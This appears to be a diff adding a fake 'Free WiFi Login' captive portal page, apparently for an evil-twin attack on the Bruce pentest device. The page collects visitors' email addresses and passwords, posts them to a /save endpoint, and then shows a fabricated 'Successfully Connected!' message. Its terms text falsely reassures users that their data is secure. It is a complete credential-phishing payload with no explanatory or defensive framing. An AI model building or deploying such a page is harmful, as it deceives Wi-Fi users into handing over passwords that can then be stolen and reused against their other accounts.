@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Free WiFi Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Montserrat', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #f5f5f5 0%, #e0e5e0 100%);
+            color: #44484b;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-attachment: fixed;
+        }
+        .container {
+            max-width: 400px;
+            margin: 20px;
+            padding: 20px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        /* WiFi Icon Styles */
+        .wifi-icon {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .wifi-circle {
+            width: 16px;
+            height: 16px;
+            background-color: #4a6149;
+            border-radius: 50%;
+            position: absolute;
+            z-index: 4;
+            animation: pulse 2s infinite;
+        }
+        .wifi-wave {
+            position: absolute;
+            border: 3px solid #4a6149;
+            border-radius: 50%;
+            opacity: 0;
+            animation: wave 2s infinite;
+        }
+        .wave1 {
+            width: 30px;
+            height: 30px;
+            animation-delay: 0s;
+        }
+        .wave2 {
+            width: 50px;
+            height: 50px;
+            animation-delay: 0.4s;
+        }
+        .wave3 {
+            width: 70px;
+            height: 70px;
+            animation-delay: 0.8s;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(0.8); opacity: 0.8; }
+            50% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(0.8); opacity: 0.8; }
+        }
+        
+        @keyframes wave {
+            0% { transform: scale(0.5); opacity: 0; }
+            25% { opacity: 0.3; }
+            50% { opacity: 0.6; }
+            75% { opacity: 0.3; }
+            100% { transform: scale(1.2); opacity: 0; }
+        }
+        h1 {
+            text-align: center;
+            color: #4a6149;
+            font-size: 28px;
+            margin-bottom: 20px;
+            font-weight: 600;
+            text-shadow: 1px 1px 2px rgba(74, 97, 73, 0.1);
+            position: relative;
+        }
+        
+        h1:after {
+            content: '';
+            position: absolute;
+            width: 80px;
+            height: 3px;
+            background-color: #4a6149;
+            bottom: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-radius: 3px;
+        }
+        form {
+            margin-top: 20px;
+        }
+        .form-group {
+            margin-bottom: 22px;
+            position: relative;
+        }
+        
+        .form-group:last-of-type {
+            margin-bottom: 30px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+            color: #4a6149;
+        }
+        input[type="text"],
+        input[type="password"],
+        input[type="email"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid rgba(74, 97, 73, 0.3);
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-family: 'Montserrat', sans-serif;
+            background-color: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            transition: border-color 0.3s, background-color 0.3s;
+            color: #44484b;
+            box-shadow: 0 2px 6px rgba(74, 97, 73, 0.1);
+        }
+        /* Further enhance input focus effect */
+        input[type="text"]:focus,
+        input[type="password"]:focus,
+        input[type="email"]:focus {
+            outline: none;
+            border-color: #4a6149;
+            background-color: rgba(255, 255, 255, 0.85);
+            box-shadow: 0 4px 8px rgba(74, 97, 73, 0.15);
+        }
+        button {
+            background-color: #4a6149;
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 8px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            font-family: 'Montserrat', sans-serif;
+            transition: background-color 0.3s, transform 0.2s;
+            box-shadow: 0 4px 12px rgba(74, 97, 73, 0.2);
+        }
+        button:hover {
+            background-color: #3d503c;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 14px rgba(74, 97, 73, 0.3);
+        }
+        
+        button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 8px rgba(74, 97, 73, 0.2);
+        }
+        .toggle-container {
+            text-align: center;
+            margin-top: 22px;
+            padding-top: 18px;
+            border-top: 1px solid rgba(74, 97, 73, 0.2);
+            position: relative;
+        }
+        
+        .toggle-container:before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 3px;
+            background-color: rgba(74, 97, 73, 0.4);
+            border-radius: 3px;
+        }
+        .toggle-link {
+            color: #4a6149;
+            text-decoration: none;
+            cursor: pointer;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+        .toggle-link:hover {
+            color: #3d503c;
+            text-decoration: underline;
+        }
+        .section {
+            display: none;
+        }
+        .section.active {
+            display: block;
+        }
+        .description {
+            text-align: center;
+            color: #4a6149;
+            margin-top: 15px;
+            margin-bottom: 20px;
+            font-size: 16px;
+            font-weight: 500;
+        }
+        .terms {
+            font-size: 12px;
+            text-align: center;
+            margin-top: 30px;
+            color: #44484b;
+        }
+        .terms-link {
+            color: #4a6149;
+            text-decoration: underline;
+            cursor: pointer;
+            margin-left: 5px;
+        }
+        
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 100;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            overflow: auto;
+        }
+        
+        .modal-content {
+            background: linear-gradient(135deg, rgba(245, 245, 245, 0.9) 0%, rgba(224, 229, 224, 0.9) 100%);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            margin: 10% auto;
+            padding: 30px;
+            width: 80%;
+            max-width: 500px;
+            border-radius: 12px;
+            position: relative;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            color: #4a6149;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .modal h2 {
+            color: #4a6149;
+            font-size: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .terms-content {
+            color: #44484b;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .terms-content h3 {
+            color: #4a6149;
+            margin-top: 20px;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .terms-list {
+            padding-left: 20px;
+            margin-bottom: 15px;
+        }
+        
+        .terms-list li {
+            margin-bottom: 8px;
+        }
+        
+        .success-message {
+            text-align: center;
+            margin: 40px 20px;
+            padding: 40px 20px;
+            animation: fadeIn 0.6s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="wifi-icon">
+                <div class="wifi-circle"></div>
+                <div class="wifi-wave wave1"></div>
+                <div class="wifi-wave wave2"></div>
+                <div class="wifi-wave wave3"></div>
+            </div>
+        </div>
+        <h1>Connect to Free WiFi</h1>
+        <p class="description">Free WiFi for up to 2 hours of use</p>
+        <p style="text-align: center; font-size: 13px; color: #5f6469; margin-top: -10px; margin-bottom: 20px;">Email-based access system</p>
+
+        <div id="login-section" class="section active">
+            <form id="login-form" method="POST" action="/save">
+                <div class="form-group">
+                    <label for="email">Email Address:</label>
+                    <input type="email" id="email" name="email" required pattern="[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <button type="submit">Connect</button>
+            </form>
+            <div class="toggle-container">
+                <span class="toggle-link" onclick="toggleSection('register')">New user? Create account</span>
+            </div>
+        </div>
+
+        <div id="register-section" class="section">
+            <form id="register-form" method="POST" action="/save">
+                <div class="form-group">
+                    <label for="register-email">Email Address:</label>
+                    <input type="email" id="register-email" name="email" required pattern="[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$">
+                </div>
+                <div class="form-group">
+                    <label for="register-password">Create Password:</label>
+                    <input type="password" id="register-password" name="password" required minlength="8">
+                </div>
+                <button type="submit">Create Account</button>
+            </form>
+            <div class="toggle-container">
+                <span class="toggle-link" onclick="toggleSection('login')">Already have an account? Login</span>
+            </div>
+        </div>
+
+        <div class="terms">
+            By connecting to this network, you agree to our Terms of Service and Privacy Policy
+            <span class="terms-link" onclick="openTerms()">read here</span>.
+        </div>
+    </div>
+    
+    <!-- Terms and Conditions Modal -->
+    <div id="termsModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeTerms()">&times;</span>
+            <h2>Terms of Service and Privacy Policy</h2>
+            <div class="terms-content">
+                <h3>1. Usage Policy</h3>
+                <ul class="terms-list">
+                    <li>This WiFi service is free for up to 2 hours of continuous use.</li>
+                    <li>After your 2-hour session expires, the service will be unavailable for your device for 5 hours.</li>
+                    <li>This time limitation ensures fair usage and prevents network congestion.</li>
+                </ul>
+                
+                <h3>2. Privacy & Data</h3>
+                <ul class="terms-list">
+                    <li>User account data is stored securely and not shared with third parties.</li>
+                    <li>We support privacy-focused email addresses and alternative account identifiers.</li>
+                    <li>Connection logs are maintained for technical and security purposes only.</li>
+                </ul>
+                
+                <h3>3. Account Usage</h3>
+                <ul class="terms-list">
+                    <li>Your account is linked to your email address. Only one active device per account is allowed.</li>
+                    <li>Sharing account credentials with others is not recommended and may result in account suspension.</li>
+                    <li>Multiple simultaneous logins from different locations will trigger our automatic security system.</li>
+                    <li>Accounts detected with unusual access patterns may be temporarily or permanently suspended.</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Toggle between login and register sections
+        function toggleSection(section) {
+            document.getElementById('login-section').classList.remove('active');
+            document.getElementById('register-section').classList.remove('active');
+            
+            document.getElementById(section + '-section').classList.add('active');
+        }
+        
+        // Open Terms Modal
+        function openTerms() {
+            document.getElementById('termsModal').style.display = 'block';
+        }
+        
+        // Close Terms Modal
+        function closeTerms() {
+            document.getElementById('termsModal').style.display = 'none';
+        }
+        
+        // Close modal if clicked outside of content
+        window.onclick = function(event) {
+            const modal = document.getElementById('termsModal');
+            if (event.target === modal) {
+                modal.style.display = 'none';
+            }
+        }
+
+        // Form submission handler - now modified to simulate success after form submission
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            // Don't prevent default - let the form submit normally to the Bruce endpoint
+            // But show a success message after a delay
+            const button = this.querySelector('button');
+            button.disabled = true;
+            button.textContent = "Connecting...";
+            
+            // Save original form submission
+            // Then simulate success message after a delay
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div class="success-message">
+                        <div class="wifi-icon">
+                            <div class="wifi-circle"></div>
+                            <div class="wifi-wave wave1"></div>
+                            <div class="wifi-wave wave2"></div>
+                            <div class="wifi-wave wave3"></div>
+                        </div>
+                        <h1 style="color:#4a6149;">Successfully Connected!</h1>
+                        <p style="color:#44484b; font-family:'Montserrat',sans-serif; font-size: 16px;">
+                            You are now connected to the Guest WiFi network.<br>
+                            Your 2-hour session has started.
+                        </p>
+                    </div>
+                `;
+            }, 1500);
+        });
+        
+        // Same for register form
+        document.getElementById('register-form').addEventListener('submit', function(e) {
+            // Don't prevent default - let the form submit normally to the Bruce endpoint
+            // But show a success message after a delay
+            const button = this.querySelector('button');
+            button.disabled = true;
+            button.textContent = "Creating Account...";
+            
+            // Save original form submission
+            // Then simulate success message after a delay
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div class="success-message">
+                        <div class="wifi-icon">
+                            <div class="wifi-circle"></div>
+                            <div class="wifi-wave wave1"></div>
+                            <div class="wifi-wave wave2"></div>
+                            <div class="wifi-wave wave3"></div>
+                        </div>
+                        <h1 style="color:#4a6149;">Account Created!</h1>
+                        <p style="color:#44484b; font-family:'Montserrat',sans-serif; font-size: 16px;">
+                            Your account has been created successfully.<br>
+                            You are now connected to the Guest WiFi network.<br>
+                            Your 2-hour session has started.
+                        </p>
+                    </div>
+                `;
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
